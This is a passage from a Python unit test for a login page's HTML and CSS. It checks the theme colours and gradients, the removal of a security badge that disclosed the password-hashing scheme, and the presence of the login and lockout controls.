        self.assertIn("--bg-surface: #FFFFFF;", css)
        self.assertIn("--blob-1: #c9dcfb;", css)

        # 4. Primary Button & Brand Logo Mint-to-Violet Gradients
        self.assertIn("linear-gradient(135deg, var(--accent-mint), var(--accent-violet))", css)
        self.assertIn(".btn-primary svg {", css)

        # 5. Absence of Login Security Badge (Eliminates Tech Stack Disclosure)
        self.assertNotIn("login-security-badge", html, "Login security badge must be removed from HTML")
        self.assertNotIn(".login-security-badge {", css, "Dead .login-security-badge CSS must be cleaned up")
        self.assertNotIn("PBKDF2-HMAC-SHA256 (100k iters)", html, "Tech stack banner must not leak on login screen")

        # 6. Core Login Screen Controls Remain Fully Intact
        self.assertIn('id="loginUsername"', html)
        self.assertIn('id="loginPassword"', html)
        self.assertIn('id="btnLogin"', html)
        self.assertIn('id="loginError"', html)
        self.assertIn('id="lockoutAlert"', html)
        self.assertIn('id="lockoutTimer"', html)


if __name__ == "__main__":
    unittest.main()



